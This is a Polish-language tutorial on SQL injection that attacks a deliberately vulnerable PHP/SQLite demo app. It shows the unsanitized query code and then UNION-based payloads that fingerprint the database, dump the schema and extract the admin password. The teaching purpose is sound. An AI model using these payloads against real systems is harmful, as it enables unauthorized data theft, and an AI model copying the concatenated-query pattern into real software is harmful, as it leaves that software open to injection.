# Atak SQL injection

Wszyscy znamy strony, które zawierają w sobie formularze czy przekazują w inny sposób wszelakie parametry. A co jeśli parametry te nie są prawidłowo przetworzone po stronie serwera i bezpośrednio trafiają do zapytań SQL?

## Przykład 

Weźmy na warsztat [przykładową aplikację]({{ data.repo_url }}/tree/master/examples/sqlinjection) wykorzystującą bazę danych SQLlite3.

Jest to prosta strona z formularzem, do którego jeśli podamy imię to zwróci nam czy jest ono śmieszne czy nie.

![Aplikacja PHP](/assets/images/web/sqlinjection/php_app.png)

Po wpisaniu imienia, jest ono wysyłane do serwera php w celu dalszej obróbki. Tak wygląda fragment kodu odpowiadający za zapytanie do bazy danych:

```php
$name = $_GET["name"];
$db = new SQLite3('example.db');
$query = "SELECT is_funny FROM funny as f, users as u JOIN users ON f.user_name=u.user_name WHERE u.user_name='$name'";
$result = @$db->query($query);
```

Po wpisaniu `admin` otrzymujemy wynik `not funny`. 

Na początek należy przeprowadzić weryfikację czy atak SQLi jest możliwy. Można to zrobić przez podanie `'` zamiast parametru.

![Aplikacja PHP - podatna?](/assets/images/web/sqlinjection/php_app_check.png)

Informacja ta mówi nam o tym, że jest to strona podatna na atak. Następnym krokiem będzie weryfikacja z jakim typem bazy danych mamy do czynienia. Można to zrobić przez sprawdzenie wersji oprogramowania - polecenie to różni się między dialektami

| Dialekt  | Polecenie  | 
|---|---|
| MySQL  | `SELECT @@version`  | 
| Oracle | `SELECT * FROM v$version`  |
| PostgreSQL | `SELECT version()`  | 
| Sqlite3 | `SELECT sqlite_version()` |

Wykonać to można przez manipulację poleceniem `UNION`, który łączy wyniki z dwóch lub więcej zapytań SQL w jedno. W tym przypadku będzie to 
```sql
admin' UNION SELECT sqlite_version(); --
```

Polecenie to zostanie po stronie serwera zamienione w:
```sql
SELECT is_funny FROM funny as f, users as u 
    JOIN users ON f.user_name=u.user_name 
    WHERE u.user_name='admin' 
UNION SELECT sqlite_version(); --'
```

![Aplikacja PHP - podatna?](/assets/images/web/sqlinjection/php_app_version.png)

Dzięki temu wiemy, że jest to baza Sqlite3. Następnym krokiem będzie ekstrakcja nazw tabel i kolumn. Zrobić to można poleceniem 
```sql
SELECT sql from sqlite_master WHERE type="table"; 
```
które w tym przypadku przybierze formę
```sql
admin' UNION SELECT sql from sqlite_master; --'
```

![Aplikacja PHP - kolumny](/assets/images/web/sqlinjection/php_app_columns.png)

Jako, że `UNION` wymaga takiej samej ilości kolumn w wyniku obu zapytań, dane z bazy będzie można wyciągać tylko pojedyńczo. Przykładowo hasło użytkownika `admin` pozyskamy stosując polecenie
```sql
admin' UNION SELECT password from users WHERE user_name = 'admin'; --'
```

![Aplikacja PHP - haslo](/assets/images/web/sqlinjection/php_app_password.png)
